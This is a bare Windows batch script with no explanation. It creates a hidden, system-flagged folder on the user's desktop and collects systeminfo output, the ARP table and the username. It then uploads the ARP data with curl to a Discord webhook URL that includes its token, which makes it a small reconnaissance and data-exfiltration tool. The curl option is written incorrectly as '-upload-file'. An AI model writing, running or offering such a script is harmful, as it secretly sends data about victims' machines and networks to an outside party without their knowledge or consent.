mkdir %userprofile%\desktop\bb
attrib +s +h +i +x %userprofile%\desktop\bb
systeminfo >> %userprofile%\desktop\bb\systeminfo.txt
arp -a >> %userprofile%\desktop\bb\arp.txt
for /f "delims=" %n in ('whoami') do set name=%n
curl -upload-file %userprofile%\desktop\bb\arp.txt https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
pause
